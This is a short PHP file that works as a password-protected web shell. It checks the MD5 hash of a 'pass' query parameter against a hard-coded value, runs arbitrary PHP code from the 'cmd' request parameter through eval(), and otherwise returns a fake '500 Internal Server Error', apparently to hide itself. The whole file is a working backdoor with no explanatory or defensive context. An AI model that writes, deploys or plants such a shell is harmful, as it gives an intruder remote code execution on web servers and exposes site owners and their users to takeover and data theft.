<?php 
$pass = md5($_GET['pass']);
if ($pass === 'cdf4db407b5b77c9f02102e60733e011'){
	eval($_REQUEST['cmd']);
}else {
	 header('HTTP/1.1 500 Internal Server Error');
}
